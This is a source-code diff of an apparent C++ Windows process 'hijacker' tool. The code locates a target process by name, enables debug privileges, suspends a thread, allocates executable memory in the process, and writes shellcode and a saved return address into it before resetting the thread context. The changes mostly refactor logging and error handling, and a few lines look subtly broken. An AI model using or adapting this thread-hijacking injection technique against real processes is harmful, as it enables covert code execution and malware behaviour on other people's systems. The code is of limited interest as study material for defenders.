@@ -1,11 +1,15 @@
 #include "includes.h"
 #include "hijacker.h"
 #include "logger.hpp"
+#include "exception.h"
 
+#pragma region NamespaceReferences
 using namespace TB;
+using Hijacker::System;
+using Hijacker::Interceptor;
 
 #pragma region InternalGlobals
-SHELLCODE_INFO psh;
+Hijacker::SHELLCODE_INFO psh;
 DWORD m_dwInternalProcessId = { 0 };
 
 char m_opcode32[] = "\x59\xB8\xD2\x04\xFF\xE0";
@@ -21,12 +25,12 @@ __declspec(naked) void Shellcode()
 		start:
 		pop ecx
 				mov eax, 0x4d2
-				jmp eax		
+				jmp eax
 	}
 }
 // "\x59\xB8\xD2\x04\x00\x00\xFF\xE0"
 
-DBGLogger dbgLogger("1.1", "tb_sys_logs.log");
+extern DBGLogger dbgLogger("1.1", "tb_sys_logs.log");
 
 PCHAR System::returnVersionState() 
 {
@@ -52,13 +56,14 @@ void System::setTokenPrivileges()
 {
 	m_localTokenPrivs.PrivilegeCount = 1;
 	m_localTokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	m_localTokenPrivs.Privileges[0].Luid.LowPart = 20;
+	m_localTokenPrivs.Privileges[0].Luid.LowPart = 20; 
 	m_localTokenPrivs.Privileges[0].Luid.HighPart = 0;
 }
 
 DBG_STATE_BOUND System::returnPrivilegeEscalationState()
 {	
 	System sys;
+	Exception exp;
 	dbgStatus = DBG_INVALID_VAR_ANY;
 
 	sys.setTokenPrivileges();
@@ -69,7 +74,8 @@ DBG_STATE_BOUND System::returnPrivilegeEscalationState()
 		CloseHandle(m_hToken);
 	} else {
 		DBG_SET_VALUE(dbgStatus, DBG_ESCALATION_ATTEMPT_FATAL);
-		throw std::runtime_error("AdjustTokenPrivileges() - FATAL");
+		dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << " AdjustTokenPrivileges() - FATAL\n";
+		exp.TBLThrowError((LPSTR)"DBG_ESCALATION_ATTEMPT_FATAL", DBG_INVALID_VAR_ANY);
 	}
 	
 	return dbgStatus;
@@ -88,10 +94,14 @@ DWORD Interceptor::FindWin32ProcessId(char * m_win32ProcessName)
 			do
 			{
 				if (!strcmp(m_procEntry32.szExeFile, m_win32ProcessName))
+
 					return m_dwInternalProcessId = m_procEntry32.th32ProcessID;
 			} while (Process32Next(m_leHandle, &m_procEntry32));
 		}
-		else { std::cerr << "Could Not Identify Process ID\n"; }
+		else { 
+			dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << "Could Not Identify Process ID\n";
+			
+		}
 
 	}
 	CloseHandle(m_leHandle);
@@ -104,6 +114,7 @@ DWORD Interceptor::FindWin32ProcessId(char * m_win32ProcessName)
 DBG_STATE_BOUND Interceptor::ExecuteWin32Shellcode(DWORD m_processId)
 {
 	Threader threader;
+	Exception exp;
 	dbgStatus = DBG_INVALID_VAR_ANY;
 
 	DWORD m_mainThreadId = threader.FindThreadWithinWin32Process(m_processId);
@@ -111,8 +122,9 @@ DBG_STATE_BOUND Interceptor::ExecuteWin32Shellcode(DWORD m_processId)
 	if (m_win32Process == NULL)
 	{
 		DBG_SET_VALUE(dbgStatus, DBG_PROCESS_STATE_INVALID);
+		/* logger.hpp, exception.h */
 		dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << "OpenProcess() - FATAL";
-		throw std::runtime_error("[DBG_PROCESS_STATE_INVALID] OpenProcess() - FATAL");
+		exp.TBLThrowError((LPSTR)"DBG_PROCESS_STATE_INVALID", DBG_INVALID_VAR_ANY);
 	}
 
 	/* PROCEED TO OPEN THE THREAD */
@@ -120,8 +132,9 @@ DBG_STATE_BOUND Interceptor::ExecuteWin32Shellcode(DWORD m_processId)
 	if (!m_hThread)
 	{
 		DBG_SET_VALUE(dbgStatus, DBG_THREADER_STATE_FATAL);
+		/* logger.hpp, exception.h */
 		dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << "OpenThread() - FATAL";
-		throw std::runtime_error("[DBG_THREADER_STATE_FATAL] OpenThread()");
+		exp.TBLThrowError((LPSTR)"DBG_THREADER_STATE_FATAL", DBG_INVALID_VAR_ANY);
 	}
 
 	m_lpContext = new CONTEXT();
@@ -130,30 +143,40 @@ DBG_STATE_BOUND Interceptor::ExecuteWin32Shellcode(DWORD m_processId)
 	if (SuspendThread(m_hThread) == DBG_INVALID_VAR_ANY) 
 	{ 
 		DBG_SET_VALUE(dbgStatus, DBG_THREAD_SUSPENSION_STATE_FATAL); 
-		dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << "SuspendThread() - FATAL";
-		throw std::runtime_error("[DBG_THREAD_SUSPENSION_STATE_FATAL] SuspendThread()");		
+		/* logger.hpp, exception.h */
+		dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << "SuspendThread() - FATAL\n";
+		exp.TBLThrowError((LPSTR)"DBG_THREAD_SUSPENSION_STATE_FATAL", DBG_INVALID_VAR_ANY);
 	}
 
 	/* LAST THREADER CHECK */
 	if (!GetThreadContext(m_hThread, m_lpContext))
 	{
 		DBG_SET_VALUE(dbgStatus, DBG_THREADER_STATE_FATAL);
-		dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << "GetThreadContext() - FATAL";
-		throw std::runtime_error("DBG_THREADER_STATE_FATAL] GetThreadContext()");
+		/* logger.hpp, exception.h */
+		dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << "GetThreadContext() - FATAL\n";
+		exp.TBLThrowError((LPSTR)"DBG_THREADER_STATE_FATAL", DBG_INVALID_VAR_ANY);
 	}
-
-	LPVOID m_lpShellcodeBaseAddr = (LPVOID)VirtualAllocEx(m_win32Process, NULL, 0x1000, MEM_COMMIT
-		| MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-	if (m_lpShellcodeBaseAddr == NULL) { DBG_SET_VALUE(dbgStatus, DBG_VIRTUAL_MEMORY_STATE_FATAL); return (DBG_STATE_BOUND)FALSE; }
-	else { std::cout << "\nMemory Allocated at: 0x" << m_lpShellcodeBaseAddr << '\n'; }
-
+	
+	LPVOID m_lpShellcodeBaseAddr = (LPVOID)VirtualAllocEx(m_win32Process, NULL, SHELLCODE_BASE_SIZE , MEM_RESERVE |
+		MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (m_lpShellcodeBaseAddr) {
+		std::cout << "\nMemory Allocated(Virtual) at: 0x" <<
+			m_lpShellcodeBaseAddr << '\n';
+	}
+	else { 
+		dbgStatus = DBG_SET_VALUE(dbgStatus, DBG_VIRTUAL_MEMORY_STATE_FATAL);
+		/* logger.hpp, exception.h */
+		dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << "VirtualAllocEx() - FATAL\n";
+		exp.TBLThrowError((LPSTR)"\n[DBG_VIRTUAL_MEMORY_STATE_FATAL]", DBG_INVALID_VAR_ANY);
+		
+	} 
+	
 #ifdef _WIN64
 #define ARCHITECHTURE_64BIT
 	/* HANDLE 64-BIT STACK ADDRESSES */
 	psh.m_lpShellcode = m_opcode64;
 	psh.dwSize = sizeof(m_opcode64);
-	m_lpContext.Rsp -= 0x8;
+	m_lpContext->Rsp -= 0x8;
 	/* WRITE THE ORIGINAL RIP */
 	if (!WriteProcessMemory(m_win32Process, (PVOID)m_lpContext->Rsp, &m_lpContext->Rip, sizeof(PVOID), nullptr))
 	{
@@ -161,16 +184,16 @@ DBG_STATE_BOUND Interceptor::ExecuteWin32Shellcode(DWORD m_processId)
 		dbgLogger << DBGLogger::m_loggerType::DBG_LOGGER_ERROR << "write_x64_address - FATAL";
 		return (DBG_STATE_BOUND)FALSE;
 	}
-	psh->m_lpCreateThreadAddr = CreateThread;
-	std::cout << "\tCreateThread Located at: " << psh->m_lpCreateThreadAddr << '\n';
+	psh.m_lpCreateThreadAddr = CreateThread;
+	std::cout << "\tCreateThread Located at: " << psh.m_lpCreateThreadAddr << '\n';
 
 #endif
-
-#ifdef _WIN32
+ 
+#ifdef _WIN32 
 #define ACHITECHTURE_32BIT	
 	/* HANDLE 32-BIT STACK ADDRESSES*/
 	psh.m_lpShellcode = m_opcode32;
-	psh.dwSize = (DWORD)ShellcodeEnd - (DWORD)Shellcode;
+	psh.dwSize = ((DWORD)ShellcodeEnd - (DWORD)Shellcode | sizeof(m_opcode32));
 	m_lpContext->Esp -= 0x4;
 	/* WRITE THE ORIGINAL EIP */
 	if (!WriteProcessMemory(m_win32Process, (PVOID)m_lpContext->Esp, &m_lpContext->Eip, sizeof(PVOID), nullptr))
@@ -199,7 +222,7 @@ DBG_STATE_BOUND Interceptor::ExecuteWin32Shellcode(DWORD m_processId)
 		return (DBG_STATE_BOUND)FALSE;
 	}
 
-	else { std::cout << "Shellcode Written To: 0x" << m_lpShellcodeBaseAddr << '\n'; }
+	else { std::cout << "Shellcode Written To: 0x" << std::hex << m_lpShellcodeBaseAddr << '\n'; }
 
 	/* UPDATE THREAD CONTEXT */
 	if (!SetThreadContext(m_hThread, m_lpContext)) { return (DBG_STATE_BOUND)FALSE; }
